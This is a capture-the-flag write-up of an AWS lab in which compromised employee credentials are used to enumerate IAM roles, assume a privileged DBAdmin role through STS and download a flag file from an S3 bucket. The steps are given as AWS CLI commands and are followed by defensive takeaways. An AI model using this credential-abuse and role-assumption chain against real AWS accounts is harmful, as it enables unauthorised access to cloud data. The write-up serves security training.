# AWS Red Team IAM Privilege Escalation - Assume Role

## Challenge Overview

### Objective

Identify and exploit an IAM privilege escalation path by abusing a misconfigured role trust relationship. The final goal is to assume a privileged IAM role and retrieve the hidden flag stored inside an S3 bucket.

### Scenario

An employee's AWS credentials have been compromised.

The initial access belongs to a low-privileged IAM user. The objective is to investigate the available permissions, discover possible privilege escalation paths, assume a more privileged role, and access protected resources.

The attack path is based on:

* IAM role enumeration
* STS AssumeRole abuse
* IAM policy analysis
* S3 resource access

### Skills Practiced

* AWS CLI authentication
* IAM enumeration
* AWS STS AssumeRole
* Temporary credential handling
* IAM policy analysis
* S3 permission discovery

---

# Environment

## Initial Access

Provided credentials:

* AWS Access Key ID
* AWS Secret Access Key

## Tools Used

* AWS CLI
* Assume Role Enumeration Tool

---

# Attack Workflow

The investigation started by configuring the AWS CLI with the provided credentials and identifying the current IAM identity.

---

## Step 1 - Configure AWS CLI Credentials

The first step was configuring AWS CLI using the provided employee credentials.

Command:

```bash
aws configure
```

To verify the current identity:

```bash
aws sts get-caller-identity
```

The returned identity was:

```text
arn:aws:iam::058264439561:user/Backend_Developer
```

At this point, the initial access was confirmed.

---

## Step 2 - Test Initial Permissions

Before searching for privilege escalation paths, several AWS services were tested to understand the current permission level.

Examples:

```bash
aws s3 ls

aws ec2 describe-instances

aws lambda list-functions

aws iam list-roles
```

All attempts returned `AccessDenied`.

This showed that the current IAM user had very limited permissions and direct access to AWS resources was not possible.

The next assumption was that the intended path was through IAM role abuse.

---

# Step 3 - Enumerate Assumable IAM Roles

The challenge description mentioned privilege escalation through IAM roles.

An AssumeRole enumeration tool was used to identify roles that could be assumed by the current identity.

The enumeration revealed a possible target role:

```text
DBAdmin
```

The role assumption was tested manually:

```bash
aws sts assume-role --role-arn arn:aws:iam::058264439561:role/DBAdmin --role-session-name test
```

The request succeeded and AWS returned temporary credentials:

* AccessKeyId
* SecretAccessKey
* SessionToken

This confirmed the privilege escalation path.

---

# Step 4 - Configure Temporary Role Credentials

The credentials returned from AssumeRole were temporary credentials and needed to be configured separately.

A new AWS CLI profile was created:

```bash
aws configure set aws_access_key_id <ACCESS_KEY> --profile Role

aws configure set aws_secret_access_key <SECRET_KEY> --profile Role

aws configure set aws_session_token <SESSION_TOKEN> --profile Role
```

The new identity was verified:

```bash
aws sts get-caller-identity --profile Role
```

The identity changed from:

```text
Backend_Developer
```

to:

```text
arn:aws:sts::058264439561:assumed-role/DBAdmin/test
```

The role assumption was successful.

---

# Step 5 - Analyze Role Permissions

After obtaining the privileged role, the next step was identifying what permissions were attached to it.

The attached policies were enumerated:

```bash
aws iam list-attached-role-policies --role-name DBAdmin --profile Role
```

The result showed:

```text
Manager_Access_S3
```

The policy details were retrieved:

```bash
aws iam get-policy-version \
--policy-arn arn:aws:iam::058264439561:policy/Manager_Access_S3 \
--version-id v1 \
--profile Role
```

The policy contained permissions:

```text
s3:GetObject
s3:ListBucket
```

The target S3 bucket was identified:

```text
securecorpbakstoragebuk
```

---

# Step 6 - Retrieve Flag From S3

The bucket contents were listed:

```bash
aws s3 ls s3://securecorpbakstoragebuk/ --recursive --profile Role
```

The flag file was discovered:

```text
Flag.txt
```

The object was downloaded:

```bash
aws s3api get-object \
--bucket securecorpbakstoragebuk \
--key Flag.txt \
flag.txt \
--profile Role
```

The downloaded file contained the final flag.

---

# Findings

## Initial Identity

The compromised credentials belonged to:

```text
Backend_Developer
```

This user had limited permissions and could not directly access AWS resources.

---

## Privilege Escalation Path

The successful attack chain:

```text
Compromised IAM User

        |
        |
        v

AssumeRole Permission

        |
        |
        v

DBAdmin Role

        |
        |
        v

Manager_Access_S3 Policy

        |
        |
        v

S3 Bucket Access

        |
        |
        v

Flag Retrieval
```

---

# Security Concepts Learned

## IAM Users vs IAM Roles

IAM users represent long-term identities, while roles provide temporary credentials.

In this scenario, the user itself was not powerful, but it could obtain temporary credentials for a more privileged role.

---

## AssumeRole Abuse

The ability to assume privileged roles can become a privilege escalation path if trust relationships are not properly configured.

Attackers often search for:

* Weak trust policies
* Overly permissive roles
* Misconfigured IAM relationships

---

## Temporary Credentials

Assumed roles provide:

* Access Key ID
* Secret Access Key
* Session Token

These credentials are temporary and should be used instead of modifying the original identity.

---

# Key Takeaways

* AccessDenied errors are useful for understanding the current privilege level.
* A low-privileged IAM user can still become dangerous if it can assume privileged roles.
* IAM roles should always have strict trust relationships.
* Attached policies reveal the real capabilities of a role.
* S3 access should follow the principle of least privilege.

---

# References

* AWS IAM Documentation
* AWS STS AssumeRole Documentation
* AWS S3 Security Best Practices
